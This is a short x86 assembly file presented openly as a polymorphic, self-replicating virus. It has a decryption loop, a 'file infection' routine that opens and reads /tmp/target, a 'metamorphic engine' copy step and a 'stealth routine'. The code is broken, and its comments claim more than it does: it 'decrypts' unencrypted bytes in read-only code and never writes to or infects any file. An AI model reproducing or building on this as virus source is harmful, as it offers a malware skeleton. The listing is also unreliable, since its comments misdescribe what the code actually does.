section .text
    global _start

_start:
    ; Polymorphic decryption routine
    push    ebp
    mov     ebp, esp
    xor     ecx, ecx        ; Initialize counter
    mov     cl, payload_len

decrypt_loop:
    ; Self-modifying decryption key
    mov     al, byte [payload + ecx - 1]
    xor     al, 0x5A        ; Encryption key
    rol     al, 3           ; Rotate left
    mov     byte [payload + ecx - 1], al
    loop    decrypt_loop

    ; Virus payload section
payload:
    ; File infection routine
    mov     eax, 5          ; sys_open
    push    dword target    ; target file
    pop     ebx
    xor     ecx, ecx        ; O_RDONLY
    int     0x80            ; syscall

    ; Self-replication mechanism
    mov     ebx, eax        ; file descriptor
    mov     eax, 3          ; sys_read
    mov     ecx, buffer
    mov     edx, 1024       ; read size
    int     0x80

transform:
    ; Metamorphic engine
    mov     esi, payload
    mov     edi, buffer
    mov     ecx, payload_len
    rep     movsb           ; copy routine

    ; Stealth routine
    mov     eax, 13         ; sys_time
    xor     ebx, ebx
    int     0x80
    
    mov     eax, 1          ; sys_exit
    xor     ebx, ebx
    int     0x80

section .data
    payload_len equ 64
    target      db "/tmp/target",0
    buffer      times 1024 db 0

section .bss
    key resb 16

